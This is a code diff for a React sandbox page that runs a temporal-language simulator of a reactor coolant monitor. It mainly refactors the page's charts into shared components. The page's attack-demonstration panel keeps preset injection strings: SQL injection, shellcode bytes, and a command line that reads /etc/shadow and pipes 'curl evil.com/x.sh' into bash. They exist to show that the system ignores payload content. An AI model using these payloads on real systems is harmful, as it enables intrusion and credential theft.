@@ -1,10 +1,16 @@
-import React, { useState, useEffect, useRef, useCallback } from 'react';
+import React, { useState, useEffect, useRef, useCallback, useMemo } from 'react';
 import Head from 'next/head';
 import Link from 'next/link';
 import { lex }           from '../lib/tempus/lexer';
 import { parse }         from '../lib/tempus/parser';
 import { buildRuntime, createSimulator } from '../lib/tempus/runtime';
-import type { SimEvent, CellDecl, ParsedProgram } from '../lib/tempus/types';
+import type { ParsedProgram } from '../lib/tempus/types';
+import {
+  CanvasScatter, CanvasBar, CanvasHBar, CanvasHistogram, CanvasLine, CanvasStrip,
+} from '../components/charts';
+import type {
+  ScatterPoint, ScatterBand, BarEntry, HBarEntry, HistBand, LineSeries, StripEntry,
+} from '../components/charts';
 
 // ── Default program ───────────────────────────────────────────────────────────
 const DEFAULT = `-- Nuclear coolant temperature monitor
@@ -52,285 +58,6 @@ function nowStamp(): string {
   return `${String(d.getMinutes()).padStart(2,'0')}:${String(d.getSeconds()).padStart(2,'0')}.${String(d.getMilliseconds()).padStart(3,'0')}`;
 }
 
-// ── Canvas helpers ────────────────────────────────────────────────────────────
-function initCanvas(canvas: HTMLCanvasElement | null): [CanvasRenderingContext2D, number, number] | null {
-  if (!canvas) return null;
-  const W = canvas.width  = canvas.offsetWidth;
-  const H = canvas.height = canvas.offsetHeight;
-  if (W === 0 || H === 0) return null;
-  const ctx = canvas.getContext('2d')!;
-  ctx.fillStyle = '#070c09';
-  ctx.fillRect(0, 0, W, H);
-  return [ctx, W, H];
-}
-
-function chartTitle(ctx: CanvasRenderingContext2D, text: string, x: number, y: number) {
-  ctx.fillStyle = 'rgba(255,255,255,0.25)';
-  ctx.font = '9px monospace';
-  ctx.textAlign = 'left';
-  ctx.fillText(text, x, y);
-}
-
-function gridLines(ctx: CanvasRenderingContext2D, pl: number, pt: number, iW: number, iH: number, cols = 5, rows = 4) {
-  ctx.strokeStyle = 'rgba(255,255,255,0.04)';
-  ctx.lineWidth = 0.5;
-  for (let i = 1; i < cols; i++) {
-    const x = pl + (iW * i) / cols;
-    ctx.beginPath(); ctx.moveTo(x, pt); ctx.lineTo(x, pt + iH); ctx.stroke();
-  }
-  for (let i = 1; i < rows; i++) {
-    const y = pt + (iH * i) / rows;
-    ctx.beginPath(); ctx.moveTo(pl, y); ctx.lineTo(pl + iW, y); ctx.stroke();
-  }
-}
-
-// ── Chart 1: ΔP timeline scatter ─────────────────────────────────────────────
-function drawDpScatter(
-  canvas: HTMLCanvasElement | null,
-  events: SimEvent[],
-  cells:  Map<string, CellDecl>,
-  colors: Map<string, string>
-) {
-  const r = initCanvas(canvas); if (!r) return;
-  const [ctx, W, H] = r;
-  const PAD = { l:54, r:10, t:14, b:26 };
-  const iW = W - PAD.l - PAD.r, iH = H - PAD.t - PAD.b;
-  const cellArr = Array.from(cells.values());
-  const yMin = Math.min(...cellArr.map(c => c.lo));
-  const yMax = Math.max(...cellArr.map(c => c.hi));
-  const yRange = yMax - yMin || 1;
-  const xS = (i: number) => PAD.l + (i / Math.max(events.length - 1, 1)) * iW;
-  const yS = (v: number) => PAD.t + iH - ((v - yMin) / yRange) * iH;
-
-  for (const [name, cell] of cells) {
-    const col = colors.get(name) ?? '#888';
-    const y1 = yS(cell.hi), y2 = yS(cell.lo);
-    ctx.fillStyle = col + '14'; ctx.fillRect(PAD.l, y1, iW, y2 - y1);
-    ctx.strokeStyle = col + '35'; ctx.lineWidth = 0.5;
-    ctx.beginPath(); ctx.moveTo(PAD.l, y1); ctx.lineTo(PAD.l + iW, y1); ctx.stroke();
-    ctx.fillStyle = col + '60'; ctx.font = '8px monospace'; ctx.textAlign = 'left';
-    ctx.fillText(name, PAD.l + 3, (y1 + y2) / 2 + 3);
-  }
-  gridLines(ctx, PAD.l, PAD.t, iW, iH);
-  for (const ev of events) {
-    const col = colors.get(ev.cell) ?? ANOMALY;
-    ctx.beginPath();
-    ctx.arc(xS(ev.index), yS(ev.dp), ev.actionFired ? 3.5 : 1.8, 0, Math.PI * 2);
-    ctx.fillStyle = ev.actionFired ? col : col + 'a0';
-    ctx.fill();
-  }
-  ctx.fillStyle = 'rgba(255,255,255,0.35)'; ctx.font = '8px monospace'; ctx.textAlign = 'right';
-  ctx.fillText(fmtDP(yMax), PAD.l - 3, PAD.t + 7);
-  ctx.fillText(fmtDP(yMin), PAD.l - 3, PAD.t + iH + 1);
-  chartTitle(ctx, 'ΔP  TIMELINE', PAD.l + 4, PAD.t + 10);
-}
-
-// ── Chart 2: cell frequency bars ─────────────────────────────────────────────
-function drawCellBar(
-  canvas: HTMLCanvasElement | null,
-  events: SimEvent[],
-  cells:  Map<string, CellDecl>,
-  colors: Map<string, string>
-) {
-  const r = initCanvas(canvas); if (!r) return;
-  const [ctx, W, H] = r;
-  const PAD = { l:8, r:8, t:18, b:34 };
-  const iW = W - PAD.l - PAD.r, iH = H - PAD.t - PAD.b;
-  const names = [...Array.from(cells.keys()), 'anomaly'];
-  const counts = new Map<string, number>();
-  names.forEach(n => counts.set(n, 0));
-  events.forEach(e => counts.set(e.cell, (counts.get(e.cell) ?? 0) + 1));
-  const maxC = Math.max(...Array.from(counts.values()), 1);
-  const bW = iW / names.length;
-  gridLines(ctx, PAD.l, PAD.t, iW, iH, names.length, 4);
-  names.forEach((name, i) => {
-    const col = colors.get(name) ?? ANOMALY;
-    const cnt = counts.get(name) ?? 0;
-    const bH  = (cnt / maxC) * iH;
-    const x   = PAD.l + i * bW;
-    ctx.fillStyle = col + '20'; ctx.fillRect(x + 1, PAD.t, bW - 2, iH);
-    ctx.fillStyle = col;       ctx.fillRect(x + 1, PAD.t + iH - bH, bW - 2, bH);
-    ctx.fillStyle = col; ctx.font = '8px monospace'; ctx.textAlign = 'center';
-    ctx.fillText(name.slice(0, 8), x + bW / 2, H - PAD.b + 12);
-    if (cnt > 0) {
-      ctx.fillStyle = 'rgba(255,255,255,0.65)';
-      ctx.fillText(String(cnt), x + bW / 2, PAD.t + iH - bH - 3);
-    }
-  });
-  chartTitle(ctx, 'CELL  FREQUENCY', PAD.l + 4, PAD.t - 5);
-}
-
-// ── Chart 3: phase strip (event-by-event COMPILE/EXECUTE timeline) ────────────
-function drawPhaseStrip(
-  canvas: HTMLCanvasElement | null,
-  events: SimEvent[]
-) {
-  const r = initCanvas(canvas); if (!r) return;
-  const [ctx, W, H] = r;
-  const PAD = { l:8, r:8, t:18, b:18 };
-  const iW = W - PAD.l - PAD.r, iH = H - PAD.t - PAD.b;
-  const recent = events.slice(-500);
-  if (recent.length === 0) { chartTitle(ctx, 'PHASE  TIMELINE', PAD.l + 4, PAD.t - 5); return; }
-  const sqW = Math.max(1, iW / recent.length);
-  recent.forEach((ev, i) => {
-    const col = ev.phase === 'EXECUTE' ? '#f59e0b' : '#60a5fa';
-    const alpha = ev.phase === 'EXECUTE' ? 'cc' : '60';
-    ctx.fillStyle = col + alpha;
-    ctx.fillRect(PAD.l + i * sqW, PAD.t, Math.max(1, sqW - 0.5), iH);
-  });
-  // legend
-  ctx.font = '8px monospace';
-  [['#60a5fa', 'COMPILE'], ['#f59e0b', 'EXECUTE']].forEach(([c, l], i) => {
-    ctx.fillStyle = c + 'cc';
-    ctx.fillRect(PAD.l + 4 + i * 70, H - 12, 8, 7);
-    ctx.fillStyle = 'rgba(255,255,255,0.35)';
-    ctx.textAlign = 'left';
-    ctx.fillText(l, PAD.l + 14 + i * 70, H - 6);
-  });
-  chartTitle(ctx, 'PHASE  TIMELINE', PAD.l + 4, PAD.t - 5);
-}
-
-// ── Chart 4: channel activity (horizontal bars) ───────────────────────────────
-function drawChannelBar(
-  canvas:   HTMLCanvasElement | null,
-  events:   SimEvent[],
-  channels: string[]
-) {
-  const r = initCanvas(canvas); if (!r) return;
-  const [ctx, W, H] = r;
-  const PAD = { l:68, r:14, t:18, b:12 };
-  const iW = W - PAD.l - PAD.r, iH = H - PAD.t - PAD.b;
-  const counts = new Map<string, number>();
-  channels.forEach(c => counts.set(c, 0));
-  events.forEach(e => counts.set(e.channel, (counts.get(e.channel) ?? 0) + 1));
-  const maxC = Math.max(...Array.from(counts.values()), 1);
-  const rowH = iH / Math.max(channels.length, 1);
-  channels.forEach((ch, i) => {
-    const cnt  = counts.get(ch) ?? 0;
-    const barW = (cnt / maxC) * iW;
-    const y    = PAD.t + i * rowH + rowH * 0.12;
-    const bH   = rowH * 0.76;
-    ctx.fillStyle = PALETTE[i % PALETTE.length] + '20'; ctx.fillRect(PAD.l, y, iW, bH);
-    ctx.fillStyle = PALETTE[i % PALETTE.length];        ctx.fillRect(PAD.l, y, barW, bH);
-    ctx.fillStyle = 'rgba(255,255,255,0.5)'; ctx.font = '9px monospace'; ctx.textAlign = 'right';
-    ctx.fillText(ch, PAD.l - 5, y + bH * 0.72);
-    ctx.textAlign = 'left';
-    if (cnt > 0) ctx.fillText(String(cnt), PAD.l + barW + 4, y + bH * 0.72);
-  });
-  chartTitle(ctx, 'CHANNEL  ACTIVITY', PAD.l + 4, PAD.t - 5);
-}
-
-// ── Chart 5: ΔP histogram (distribution) ─────────────────────────────────────
-function drawDpHistogram(
-  canvas: HTMLCanvasElement | null,
-  events: SimEvent[],
-  cells:  Map<string, CellDecl>,
-  colors: Map<string, string>
-) {
-  const r = initCanvas(canvas); if (!r) return;
-  const [ctx, W, H] = r;
-  const PAD = { l:10, r:10, t:18, b:26 };
-  const iW = W - PAD.l - PAD.r, iH = H - PAD.t - PAD.b;
-  if (events.length === 0) { chartTitle(ctx, 'ΔP  HISTOGRAM', PAD.l + 4, PAD.t - 5); return; }
-
-  const cellArr = Array.from(cells.values());
-  const xMin = Math.min(...cellArr.map(c => c.lo));
-  const xMax = Math.max(...cellArr.map(c => c.hi));
-  const range = xMax - xMin || 1;
-
-  const BINS = 40;
-  const binW = range / BINS;
-  const counts = new Array(BINS).fill(0);
-  events.forEach(ev => {
-    const b = Math.floor((ev.dp - xMin) / binW);
-    if (b >= 0 && b < BINS) counts[b]++;
-  });
-  const maxC = Math.max(...counts, 1);
-  const pxW  = iW / BINS;
-  const xS   = (v: number) => PAD.l + ((v - xMin) / range) * iW;
-  const yS   = (c: number) => PAD.t + iH - (c / maxC) * iH;
-
-  // cell band backgrounds
-  for (const cell of cellArr) {
-    const col = colors.get(cell.name) ?? '#888';
-    ctx.fillStyle = col + '12';
-    ctx.fillRect(xS(cell.lo), PAD.t, xS(cell.hi) - xS(cell.lo), iH);
-  }
-
-  // bars coloured by which cell each bin falls in
-  for (let b = 0; b < BINS; b++) {
-    if (counts[b] === 0) continue;
-    const dp = xMin + (b + 0.5) * binW;
-    let col = ANOMALY;
-    for (const cell of cellArr) if (dp >= cell.lo && dp <= cell.hi) { col = colors.get(cell.name) ?? '#888'; break; }
-    ctx.fillStyle = col + 'c0';
-    ctx.fillRect(PAD.l + b * pxW, yS(counts[b]), Math.max(1, pxW - 0.5), iH - (yS(counts[b]) - PAD.t));
-  }
-
-  // x axis ticks
-  ctx.fillStyle = 'rgba(255,255,255,0.28)'; ctx.font = '8px monospace';
-  [xMin, (xMin + xMax) / 2, xMax].forEach(v => {
-    ctx.textAlign = 'center';
-    ctx.fillText(fmtDP(v), xS(v), H - 6);
-    ctx.strokeStyle = 'rgba(255,255,255,0.08)'; ctx.lineWidth = 0.5;
-    ctx.beginPath(); ctx.moveTo(xS(v), PAD.t); ctx.lineTo(xS(v), PAD.t + iH); ctx.stroke();
-  });
-  chartTitle(ctx, 'ΔP  HISTOGRAM', PAD.l + 4, PAD.t - 5);
-}
-
-// ── Chart 6: action dispatch rate (rolling line) ──────────────────────────────
-function drawActionRate(
-  canvas: HTMLCanvasElement | null,
-  events: SimEvent[],
-  colors: Map<string, string>
-) {
-  const r = initCanvas(canvas); if (!r) return;
-  const [ctx, W, H] = r;
-  const PAD = { l:36, r:10, t:18, b:24 };
-  const iW = W - PAD.l - PAD.r, iH = H - PAD.t - PAD.b;
-
-  // rolling window: count dispatches per 50-event window
-  const WIN = 50;
-  const pts: number[] = [];
-  for (let i = 0; i < events.length; i++) {
-    const lo = Math.max(0, i - WIN + 1);
-    let cnt = 0;
-    for (let j = lo; j <= i; j++) if (events[j].actionFired) cnt++;
-    pts.push(cnt / Math.min(i + 1, WIN));
-  }
-  if (pts.length === 0) { chartTitle(ctx, 'ACTION  RATE', PAD.l + 4, PAD.t - 5); return; }
-
-  const maxV = Math.max(...pts, 0.01);
-  const xS = (i: number) => PAD.l + (i / Math.max(pts.length - 1, 1)) * iW;
-  const yS = (v: number) => PAD.t + iH - (v / maxV) * iH;
-
-  gridLines(ctx, PAD.l, PAD.t, iW, iH, 5, 4);
-
-  // fill
-  ctx.beginPath();
-  ctx.moveTo(xS(0), yS(0));
-  pts.forEach((v, i) => ctx.lineTo(xS(i), yS(v)));
-  ctx.lineTo(xS(pts.length - 1), PAD.t + iH);
-  ctx.lineTo(xS(0), PAD.t + iH);
-  ctx.closePath();
-  ctx.fillStyle = '#58E6D9' + '20';
-  ctx.fill();
-
-  // line
-  ctx.beginPath();
-  pts.forEach((v, i) => {
-    if (i === 0) ctx.moveTo(xS(i), yS(v));
-    else         ctx.lineTo(xS(i), yS(v));
-  });
-  ctx.strokeStyle = '#58E6D9'; ctx.lineWidth = 1.5; ctx.stroke();
-
-  // y labels
-  ctx.fillStyle = 'rgba(255,255,255,0.3)'; ctx.font = '8px monospace'; ctx.textAlign = 'right';
-  ctx.fillText(maxV.toFixed(2), PAD.l - 3, PAD.t + 5);
-  ctx.fillText('0', PAD.l - 3, PAD.t + iH + 1);
-  chartTitle(ctx, 'ACTION  RATE  (rolling)', PAD.l + 4, PAD.t - 5);
-}
-
 // ── State strip ───────────────────────────────────────────────────────────────
 function StateStrip({ phase, cycle, lastDP, activeCell, lastAction, colors }: {
   phase: string; cycle: number; lastDP: number | null;
@@ -342,53 +69,40 @@ function StateStrip({ phase, cycle, lastDP, activeCell, lastAction, colors }: {
   const cellCol   = activeCell ? (colors.get(activeCell) ?? 'rgba(255,255,255,0.6)') : 'rgba(255,255,255,0.22)';
 
   const items: { k: string; node: React.ReactNode }[] = [
-    {
-      k: 'Phase σ',
-      node: (
-        <span style={{
-          display:'inline-block', padding:'2px 8px',
-          border:`1px solid ${phaseCol}`, color: phaseCol,
-          fontSize:10, letterSpacing:'0.1em',
-          background: phaseGlow,
-          boxShadow: phase === 'EXECUTE' ? `0 0 10px ${phaseGlow}` : 'none',
-        }}>{phase}</span>
+    { k: 'Phase σ', node: (
+        <span style={{ display:'inline-block', padding:'2px 8px',
+                       border:`1px solid ${phaseCol}`, color: phaseCol, fontSize:10,
+                       letterSpacing:'0.1em', background: phaseGlow,
+                       boxShadow: phase === 'EXECUTE' ? `0 0 10px ${phaseGlow}` : 'none' }}>
+          {phase}
+        </span>
       ),
     },
     { k: 'Cycle M',    node: <span style={{ color:'rgba(255,255,255,0.7)' }}>{cycle > 0 ? cycle.toLocaleString() : '—'}</span> },
     { k: 'ΔP(k)',      node: <span style={{ color:'rgba(255,255,255,0.7)' }}>{lastDP !== null ? fmtDP(lastDP) : '—'}</span> },
     { k: 'Cell',       node: <span style={{ color: cellCol, fontWeight:600 }}>{activeCell ?? '—'}</span> },
-    { k: 'Last action',node: <span style={{ color:'rgba(255,255,255,0.42)', fontSize:10, whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis', display:'block' }}>{lastAction ?? '—'}</span> },
+    { k: 'Last action',node: <span style={{ color:'rgba(255,255,255,0.42)', fontSize:10, display:'block', overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>{lastAction ?? '—'}</span> },
   ];
 
   return (
-    <div style={{
-      display:'grid', gridTemplateColumns:'repeat(5, 1fr)',
-      borderBottom:'1px solid rgba(255,255,255,0.07)',
-      background:'#080e0b', flexShrink:0,
-    }}>
+    <div style={{ display:'grid', gridTemplateColumns:'repeat(5, 1fr)',
+                  borderBottom:'1px solid rgba(255,255,255,0.07)',
+                  background:'#080e0b', flexShrink:0 }}>
       {items.map(({ k, node }, i) => (
-        <div key={k} style={{
-          padding:'8px 13px',
-          borderRight: i < 4 ? '1px solid rgba(255,255,255,0.04)' : 'none',
-        }}>
+        <div key={k} style={{ padding:'8px 13px', borderRight: i < 4 ? '1px solid rgba(255,255,255,0.04)' : 'none' }}>
           <div style={{ fontSize:8, letterSpacing:'0.14em', color:'rgba(255,255,255,0.22)',
-                        fontFamily:'monospace', textTransform:'uppercase', marginBottom:4 }}>
-            {k}
-          </div>
-          <div style={{ fontSize:13, fontFamily:'monospace', fontWeight:500, lineHeight:1.2 }}>
-            {node}
-          </div>
+                        fontFamily:'monospace', textTransform:'uppercase', marginBottom:4 }}>{k}</div>
+          <div style={{ fontSize:13, fontFamily:'monospace', fontWeight:500, lineHeight:1.2 }}>{node}</div>
         </div>
       ))}
     </div>
   );
 }
 
-// ── Cell registry (React) ─────────────────────────────────────────────────────
-function CellRegistry({ cells, colors, whens, counts, activeCell }: {
-  cells:      Map<string, CellDecl>;
+// ── Cell registry ─────────────────────────────────────────────────────────────
+function CellRegistry({ prog, colors, counts, activeCell }: {
+  prog:       ParsedProgram;
   colors:     Map<string, string>;
-  whens:      Map<string, string[]>;
   counts:     Map<string, number>;
   activeCell: string | null;
 }) {
@@ -399,9 +113,9 @@ function CellRegistry({ cells, colors, whens, counts, activeCell }: {
         CELL  REGISTRY  Γ
       </div>
       <div style={{ flex:1, overflowY:'auto', padding:'0 7px 7px' }}>
-        {Array.from(cells.values()).map(cell => {
+        {Array.from(prog.cells.values()).map(cell => {
           const col    = colors.get(cell.name) ?? '#888';
-          const acts   = whens.get(cell.name) ?? [];
+          const acts   = prog.whens.get(cell.name) ?? [];
           const hits   = counts.get(cell.name) ?? 0;
           const active = cell.name === activeCell;
           return (
@@ -409,17 +123,12 @@ function CellRegistry({ cells, colors, whens, counts, activeCell }: {
               padding:'6px 8px', marginBottom:3,
               border:`1px solid ${active ? col + 'aa' : 'rgba(255,255,255,0.05)'}`,
               background: active ? col + '10' : 'rgba(255,255,255,0.01)',
-              boxShadow: active ? `0 0 12px ${col}25` : 'none',
-              transition:'all 0.12s',
+              boxShadow: active ? `0 0 12px ${col}25` : 'none', transition:'all 0.12s',
             }}>
               <div style={{ display:'flex', justifyContent:'space-between' }}>
                 <span style={{ fontFamily:'monospace', fontSize:10, color: active ? col : col + 'bb',
-                               fontWeight: active ? 700 : 400 }}>
-                  {cell.name}
-                </span>
-                <span style={{ fontFamily:'monospace', fontSize:10, color:'rgba(255,255,255,0.2)' }}>
-                  {hits}
-                </span>
+                               fontWeight: active ? 700 : 400 }}>{cell.name}</span>
+                <span style={{ fontFamily:'monospace', fontSize:10, color:'rgba(255,255,255,0.2)' }}>{hits}</span>
               </div>
               <div style={{ fontFamily:'monospace', fontSize:8, color:'rgba(255,255,255,0.25)', marginTop:2 }}>
                 [{fmtDP(cell.lo)}, {fmtDP(cell.hi)}]
@@ -439,7 +148,7 @@ function CellRegistry({ cells, colors, whens, counts, activeCell }: {
   );
 }
 
-// ── Action log (React) ────────────────────────────────────────────────────────
+// ── Action log ────────────────────────────────────────────────────────────────
 interface ActionEntry { ts: string; cell: string; action: string; dp: number; color: string; }
 
 function ActionLog({ entries }: { entries: ActionEntry[] }) {
@@ -457,24 +166,20 @@ function ActionLog({ entries }: { entries: ActionEntry[] }) {
       ) : (
         <div style={{ flex:1, overflowY:'auto' }}>
           {entries.map((e, i) => (
-            <div key={i} style={{
-              display:'grid', gridTemplateColumns:'50px 1fr 54px',
-              gap:'0 6px', padding:'3px 9px',
-              borderBottom:'1px solid rgba(255,255,255,0.03)',
-              fontSize:9, fontFamily:'monospace',
-            }}>
+            <div key={i} style={{ display:'grid', gridTemplateColumns:'50px 1fr 54px',
+                                  gap:'0 6px', padding:'3px 9px',
+                                  borderBottom:'1px solid rgba(255,255,255,0.03)',
+                                  fontSize:9, fontFamily:'monospace' }}>
               <span style={{ color:'rgba(255,255,255,0.2)' }}>{e.ts}</span>
               <div style={{ minWidth:0 }}>
                 <span style={{ color: e.color, fontWeight:600 }}>{e.cell}</span>
-                <span style={{ color:'rgba(255,255,255,0.33)', marginLeft:5,
-                               overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap',
-                               display:'inline-block', maxWidth:'calc(100% - 68px)', verticalAlign:'bottom' }}>
+                <span style={{ color:'rgba(255,255,255,0.33)', marginLeft:5, overflow:'hidden',
+                               textOverflow:'ellipsis', whiteSpace:'nowrap', display:'inline-block',
+                               maxWidth:'calc(100% - 68px)', verticalAlign:'bottom' }}>
                   {e.action}
                 </span>
               </div>
-              <span style={{ color:'rgba(255,255,255,0.2)', textAlign:'right', fontSize:8 }}>
-                {fmtDP(e.dp)}
-              </span>
+              <span style={{ color:'rgba(255,255,255,0.2)', textAlign:'right', fontSize:8 }}>{fmtDP(e.dp)}</span>
             </div>
           ))}
         </div>
@@ -488,14 +193,12 @@ const ATTACK_PRESETS: Record<string, string> = {
   SQL:  `'; DROP TABLE reactor_logs; --\nUNION SELECT password FROM admin_users WHERE '1'='1`,
   BOF:  `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\\x90\\x90\\x90\\x90\\xeb\\x1f\\x5e\\x89\\x76`,
   CMD:  `; cat /etc/shadow\n|| curl evil.com/x.sh | bash`,
-  JSON: `{"op":"emergency_shutdown","authorized":true,"by":"admin"}\n{"cell":"CRITICAL","force_dispatch":true}`,
+  JSON: `{"op":"emergency_shutdown","authorized":true}\n{"cell":"CRITICAL","force_dispatch":true}`,
 };
 
-interface AttackEntry { ts: string; bytes: number; }
-
-function AttackPanel({ cells }: { cells: Map<string, CellDecl> }) {
+function AttackPanel({ cells }: { cells: Map<string, unknown> }) {
   const [payload, setPayload] = useState(`'; DROP TABLE reactor_logs; --\n\nAAAAAAAAAAAA\\x90\\x90\\x90\\xeb\\x1f\n\n{"op":"emergency_shutdown","authorized":true}`);
-  const [log,   setLog]   = useState<AttackEntry[]>([]);
+  const [log,   setLog]   = useState<{ ts: string; bytes: number }[]>([]);
   const [stats, setStats] = useState({ injections: 0, bytes: 0 });
 
   const inject = useCallback((text: string) => {
@@ -512,9 +215,10 @@ function AttackPanel({ cells }: { cells: Map<string, CellDecl> }) {
       <div style={{ padding:'10px 13px', background:'#0a1209',
                     borderBottom:'1px solid rgba(255,255,255,0.05)',
                     fontSize:10, fontFamily:'monospace', color:'rgba(255,255,255,0.32)', lineHeight:1.55 }}>
-        A temporal system has <span style={{ color:'#58E6D9' }}>no content parser</span>. The only datum a pulse contributes is{' '}
-        <em style={{ color:'rgba(255,255,255,0.6)' }}>when it arrived</em>. Inject anything —
-        the action set stays bounded by the compiled cell registry.{' '}
+        A temporal system has <span style={{ color:'#58E6D9' }}>no content parser</span>.
+        The only datum a pulse contributes is{' '}
+        <em style={{ color:'rgba(255,255,255,0.6)' }}>when it arrived</em>.
+        Inject anything — the action set stays bounded by the compiled cell registry.{' '}
         <span style={{ color:'rgba(255,255,255,0.18)' }}>Thm. 6.1</span>
       </div>
       <div style={{ padding:'10px 11px', borderBottom:'1px solid rgba(255,255,255,0.05)', flexShrink:0 }}>
@@ -539,7 +243,7 @@ function AttackPanel({ cells }: { cells: Map<string, CellDecl> }) {
             style={{ fontFamily:'monospace', fontSize:10, letterSpacing:'0.1em', padding:'5px 13px',
                      background:'transparent', color:'rgba(255,255,255,0.28)',
                      border:'1px solid rgba(255,255,255,0.1)', cursor:'pointer' }}>FLOOD ×100</button>
-          <button onClick={() => { setLog([]); setStats({ injections: 0, bytes: 0 }); }}
+          <button onClick={() => { setLog([]); setStats({ injections:0, bytes:0 }); }}
             style={{ fontFamily:'monospace', fontSize:10, padding:'5px 13px', marginLeft:'auto',
                      background:'transparent', color:'rgba(255,255,255,0.18)',
                      border:'1px solid rgba(255,255,255,0.07)', cursor:'pointer' }}>RESET</button>
@@ -550,7 +254,7 @@ function AttackPanel({ cells }: { cells: Map<string, CellDecl> }) {
         {[['INJECTED', String(stats.injections), undefined],
           ['BYTES', stats.bytes.toLocaleString(), undefined],
           ['PARSERS', '0', '#34d399'],
-          ['|Cells(A)|', String(cells.size), '#58E6D9']
+          ['|Cells(A)|', String(cells.size), '#58E6D9'],
         ].map(([k, v, c]) => (
           <div key={k as string} style={{ padding:'8px 6px', textAlign:'center',
                                           borderRight:'1px solid rgba(255,255,255,0.04)' }}>
@@ -583,15 +287,10 @@ function AttackPanel({ cells }: { cells: Map<string, CellDecl> }) {
 interface Stats { total: number; dispatched: number; anomalies: number; done: boolean; }
 interface LiveState { phase: string; cycle: number; lastDP: number | null; activeCell: string | null; lastAction: string | null; }
 
-// canvas ref bundle
-type Canvases = {
-  dp:    React.RefObject<HTMLCanvasElement>;
-  cell:  React.RefObject<HTMLCanvasElement>;
-  phase: React.RefObject<HTMLCanvasElement>;
-  chan:  React.RefObject<HTMLCanvasElement>;
-  hist:  React.RefObject<HTMLCanvasElement>;
-  rate:  React.RefObject<HTMLCanvasElement>;
-};
+const STRIP_LEGEND = [
+  { color: '#60a5fa', label: 'COMPILE' },
+  { color: '#f59e0b', label: 'EXECUTE' },
+];
 
 function TempusSandbox() {
   const [code,       setCode]       = useState(DEFAULT);
@@ -607,48 +306,54 @@ function TempusSandbox() {
   const [parsedProg, setParsedProg] = useState<ParsedProgram | null>(null);
   const [colors,     setColors]     = useState<Map<string, string>>(new Map());
   const [cellCounts, setCellCounts] = useState<Map<string, number>>(new Map());
-  const [channels,   setChannels]   = useState<string[]>([]);
+
+  // ── chart data state ──────────────────────────────────────────────────────
+  const [scatterPoints, setScatterPoints] = useState<ScatterPoint[]>([]);
+  const [scatterBands,  setScatterBands]  = useState<ScatterBand[]>([]);
+  const [stripEntries,  setStripEntries]  = useState<StripEntry[]>([]);
+  const [chanBarData,   setChanBarData]   = useState<HBarEntry[]>([]);
+  const [dpValues,      setDpValues]      = useState<number[]>([]);
+  const [histBands,     setHistBands]     = useState<HistBand[]>([]);
+  const [rateSeries,    setRateSeries]    = useState<LineSeries[]>([]);
 
   const simRef      = useRef<ReturnType<typeof createSimulator> | null>(null);
   const colorsRef   = useRef<Map<string, string>>(new Map());
   const channelsRef = useRef<string[]>([]);
   const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
-  const cvs: Canvases = {
-    dp:    useRef<HTMLCanvasElement>(null),
-    cell:  useRef<HTMLCanvasElement>(null),
-    phase: useRef<HTMLCanvasElement>(null),
-    chan:  useRef<HTMLCanvasElement>(null),
-    hist:  useRef<HTMLCanvasElement>(null),
-    rate:  useRef<HTMLCanvasElement>(null),
-  };
-
-  const redrawAll = useCallback(() => {
-    if (!simRef.current) return;
-    const evs  = simRef.current.getEvents();
-    const cels = simRef.current.getCells();
-    drawDpScatter  (cvs.dp.current,    evs, cels, colorsRef.current);
-    drawCellBar    (cvs.cell.current,  evs, cels, colorsRef.current);
-    drawPhaseStrip (cvs.phase.current, evs);
-    drawChannelBar (cvs.chan.current,  evs, channelsRef.current);
-    drawDpHistogram(cvs.hist.current,  evs, cels, colorsRef.current);
-    drawActionRate (cvs.rate.current,  evs, colorsRef.current);
-  }, []); // eslint-disable-line react-hooks/exhaustive-deps
+  // ── cell bar data derived from current state ──────────────────────────────
+  const cellBarData = useMemo<BarEntry[]>(() => {
+    if (!parsedProg) return [];
+    return [...Array.from(parsedProg.cells.keys()), 'anomaly'].map(name => ({
+      label: name,
+      value: cellCounts.get(name) ?? 0,
+      color: colors.get(name) ?? ANOMALY,
+    }));
+  }, [parsedProg, cellCounts, colors]);
 
   const handleRun = useCallback(() => {
     try {
       setError(null);
-      const prog       = buildRuntime(parse(lex(code)));
-      const newColors  = cellPalette(Array.from(prog.cells.keys()));
-      const newChans   = prog.compose?.channels ?? Array.from(prog.syncs.keys());
+      const prog      = buildRuntime(parse(lex(code)));
+      const newColors = cellPalette(Array.from(prog.cells.keys()));
+      const newChans  = prog.compose?.channels ?? Array.from(prog.syncs.keys());
       colorsRef.current   = newColors;
       channelsRef.current = newChans;
       setColors(newColors);
-      setChannels(newChans);
       setParsedProg(prog);
       setActionLog([]);
       setCellCounts(new Map());
       setLiveState({ phase:'COMPILE', cycle:0, lastDP:null, activeCell:null, lastAction:null });
+
+      // set stable band data from compiled program
+      setScatterBands(Array.from(prog.cells.values()).map(c => ({
+        label: c.name, lo: c.lo, hi: c.hi, color: newColors.get(c.name) ?? '#888',
+      })));
+      setHistBands(Array.from(prog.cells.values()).map(c => ({
+        lo: c.lo, hi: c.hi, color: newColors.get(c.name) ?? '#888',
+      })));
+      setChanBarData(newChans.map((ch, i) => ({ label: ch, value: 0, color: PALETTE[i % PALETTE.length] })));
+
       const batchSize = Math.max(1, Math.floor(speed / 20));
       simRef.current  = createSimulator(prog, { totalEvents: nEvents, noiseSigma: noise, seed: 42, batchSize });
       setRunning(true);
@@ -668,13 +373,14 @@ function TempusSandbox() {
     setCellCounts(new Map());
     setStats({ total:0, dispatched:0, anomalies:0, done:false });
     setLiveState({ phase:'IDLE', cycle:0, lastDP:null, activeCell:null, lastAction:null });
-    Object.values(cvs).forEach(ref => {
-      const c = ref.current;
-      if (c) { const ctx = c.getContext('2d'); ctx?.clearRect(0, 0, c.width, c.height); }
-    });
-  }, [handleStop]); // eslint-disable-line react-hooks/exhaustive-deps
+    setScatterPoints([]);
+    setStripEntries([]);
+    setChanBarData(channelsRef.current.map((ch, i) => ({ label:ch, value:0, color: PALETTE[i % PALETTE.length] })));
+    setDpValues([]);
+    setRateSeries([]);
+  }, [handleStop]);
 
-  // simulation loop
+  // ── simulation loop ───────────────────────────────────────────────────────
   useEffect(() => {
     if (!running) return;
     intervalRef.current = setInterval(() => {
@@ -685,40 +391,67 @@ function TempusSandbox() {
       }
       const batch = simRef.current.generateBatch();
